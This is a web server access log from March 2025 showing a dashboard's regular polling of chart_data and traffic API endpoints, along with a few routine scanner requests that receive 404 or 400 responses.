193.189.185.113 - - [12/Mar/2025:10:35:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:36:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:36:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:37:51 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 117211 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:37:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:37:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:38:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:38:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:39:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:39:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:40:22 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 116345 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:40:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:40:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:41:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:41:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:42:52 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 116345 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:42:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:42:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
93.174.93.12 - - [12/Mar/2025:10:43:51 +0000] "GET / HTTP/1.0" 404 48 "-" "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
82.198.201.114 - - [12/Mar/2025:10:43:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:43:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:44:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2583 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:44:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2605 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:45:31 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 117480 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:45:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2605 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:45:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2605 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
141.98.11.175 - - [12/Mar/2025:10:46:28 +0000] "GET / HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
82.198.201.114 - - [12/Mar/2025:10:46:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2605 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:46:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2605 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:47:52 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 117480 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:47:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2605 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:47:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
20.168.5.198 - - [12/Mar/2025:10:48:26 +0000] "MGLNDD_212.101.140.57_443" 400 12 "-" "-"
82.198.201.114 - - [12/Mar/2025:10:48:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:48:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:49:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:49:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:50:39 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 114704 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:50:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:50:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:51:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:51:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:52:52 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 114704 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:52:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:52:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:53:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:53:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
45.156.130.20 - - [12/Mar/2025:10:54:20 +0000] "GET / HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:54:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:54:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:55:47 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 116024 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:55:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:55:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:56:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2604 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:57:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2632 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:57:52 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 116024 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:57:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2632 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:58:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2632 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:58:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2632 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:59:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2632 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:59:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2632 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:00:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:11:00:54 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 109997 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:00:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:01:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:01:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:02:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:02:53 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 109997 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:11:02:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:03:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:03:59 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:04:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:05:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:05:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
179.43.175.246 - - [12/Mar/2025:11:05:20 +0000] "GET / HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
82.198.201.114 - - [12/Mar/2025:11:06:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:06:00 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 103929 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:11:06:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:07:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:07:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:07:53 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 103929 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:11:08:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:08:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
156.229.21.54 - - [12/Mar/2025:11:08:28 +0000] "GET / HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
156.229.21.54 - - [12/Mar/2025:11:08:46 +0000] "GET /favicon.ico HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
156.229.21.54 - - [12/Mar/2025:11:08:47 +0000] "GET /robots.txt HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
156.229.21.54 - - [12/Mar/2025:11:08:47 +0000] "GET /sitemap.xml HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
82.198.201.114 - - [12/Mar/2025:11:09:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2631 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:09:02 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3080 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:10:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3080 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:10:02 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3080 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:11:00 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3080 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
